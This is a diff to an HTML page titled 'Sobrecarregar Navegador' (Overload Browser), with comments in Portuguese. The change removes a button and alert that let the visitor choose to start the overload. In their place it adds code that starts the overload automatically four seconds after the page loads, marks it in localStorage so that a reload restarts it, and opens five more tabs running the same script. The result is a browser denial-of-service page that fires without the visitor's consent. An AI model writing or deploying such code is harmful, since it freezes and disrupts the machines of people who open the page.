@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -29,17 +29,14 @@
             if (localStorage.getItem('overloadStarted') === 'true') {
                 overload(); // Começa a sobrecarga automaticamente
                 openAndOverload(); // Abre 5 novas abas com o script de sobrecarga
+            } else {
+                // Inicia a sobrecarga após 4 segundos
+                setTimeout(function() {
+                    localStorage.setItem('overloadStarted', 'true'); // Marca que a sobrecarga foi iniciada
+                    overload(); // Começa a sobrecarga na aba atual
+                    openAndOverload(); // Abre 5 novas abas com o script de sobrecarga
+                }, 4000); // Atraso de 4 segundos
             }
-        }
-
-        // Aviso que ocorrerá a sobrecarga após 5 segundos
-        function startOverload() {
-            alert("A sobrecarga começará em 5 segundos.");
-            setTimeout(function() {
-                localStorage.setItem('overloadStarted', 'true'); // Marca que a sobrecarga foi iniciada
-                overload(); // Começa a sobrecarga na aba atual
-                openAndOverload(); // Abre 5 novas abas com o script de sobrecarga
-            }, 5000); // Atraso de 5 segundos
         }
 
         // Verifica o status de sobrecarga ao carregar a página
@@ -48,7 +45,6 @@
 </head>
 <body>
     <h1>Sobrecarregar Navegador</h1>
-    <p>O navegador será sobrecarregado em 5 segundos. Aguarde...</p>
-    <button onclick="startOverload()">Iniciar Sobrecarga</button>
+    <p>O navegador será sobrecarregado em 4 segundos. Aguarde...</p>
 </body>
 </html>
